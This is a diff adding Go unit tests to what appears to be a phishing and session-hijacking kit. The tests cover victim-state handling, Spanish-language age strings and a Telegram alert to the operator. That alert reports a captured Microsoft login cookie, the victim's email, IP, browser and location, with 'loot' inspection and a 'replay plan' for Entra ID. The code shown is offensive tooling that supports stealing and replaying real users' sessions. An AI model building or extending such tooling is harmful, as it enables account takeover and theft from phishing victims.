@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"strings"
 	"testing"
+	"time"
 )
 
 func sess(tokens map[string]map[string]*CookieToken, password string) Session {
@@ -216,6 +217,72 @@ func TestSuggestAcceptLang(t *testing.T) {
 	}
 	if suggestAcceptLang("") != "" {
 		t.Fatal("empty")
+	}
+}
+
+func TestNormalizeVState_Bounce(t *testing.T) {
+	st := normalizeVState(victimState{Status: "bounced", Bounce: "ca"})
+	if st.Bounce != "ca" || st.Status != "bounced" {
+		t.Fatalf("%+v", st)
+	}
+	st = normalizeVState(victimState{Status: "inbox", Bounce: "ca"})
+	if st.Bounce != "" {
+		t.Fatalf("bounce should clear off bounced: %+v", st)
+	}
+	st = normalizeVState(victimState{Status: "bounced", Bounce: "nope"})
+	if st.Bounce != "" {
+		t.Fatalf("unknown bounce: %+v", st)
+	}
+	st = normalizeVState(victimState{Status: "copied"})
+	if st.Status != "inbox" {
+		t.Fatalf("copied folds to inbox: %+v", st)
+	}
+}
+
+func TestRelAge(t *testing.T) {
+	if g := relAge(40 * time.Second); g != "hace 40s" {
+		t.Fatalf("%q", g)
+	}
+	if g := relAge(-3 * time.Second); g != "hace 0s" {
+		t.Fatalf("neg %q", g)
+	}
+	if g := relAge(5 * time.Minute); g != "hace 5m" {
+		t.Fatalf("%q", g)
+	}
+}
+
+func TestFormatTelegramAlert(t *testing.T) {
+	s := sess(map[string]map[string]*CookieToken{
+		"login.microsoftonline.com": {"ESTSAUTHPERSISTENT": tok("1.AX0AMe_N-B6jSkuT5F-long")},
+	}, "supersecret")
+	s.Id = 46
+	s.Username = "victim@contoso.com"
+	s.UpdateTime = 1_700_000_000
+	s.RemoteAddr = "8.8.8.8"
+	s.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+	loot := s.inspectLoot()
+	plan := s.replayPlan()
+	g := geoInfo{Country: "Spain", CountryCode: "ES", City: "Lleida", ASN: "AS3352"}
+	now := time.Unix(1_700_000_040, 0)
+	msg := formatTelegramAlert(s, loot, plan, g, now, false)
+	if !strings.Contains(msg, "#46") || !strings.Contains(msg, "hace 40s") {
+		t.Fatalf("age/id missing: %s", msg)
+	}
+	if strings.Contains(msg, "supersecret") || strings.Contains(strings.ToLower(msg), "cookie") {
+		t.Fatalf("leaked secret: %s", msg)
+	}
+	if !strings.Contains(msg, "Entra ID") || !strings.Contains(msg, "login.microsoftonline.com") {
+		t.Fatalf("plan missing: %s", msg)
+	}
+	if !strings.Contains(msg, "ES") || !strings.Contains(msg, "Chrome") {
+		t.Fatalf("geo/ua missing: %s", msg)
+	}
+	min := formatTelegramAlert(s, loot, plan, g, now, true)
+	if strings.Contains(min, "victim@") || strings.Contains(min, "8.8.8.8") || strings.Contains(min, "supersecret") {
+		t.Fatalf("minimal leaked: %s", min)
+	}
+	if !strings.Contains(min, "#46") || !strings.Contains(min, "hace 40s") || !strings.Contains(min, "ES") {
+		t.Fatalf("minimal age/id: %s", min)
 	}
 }
 
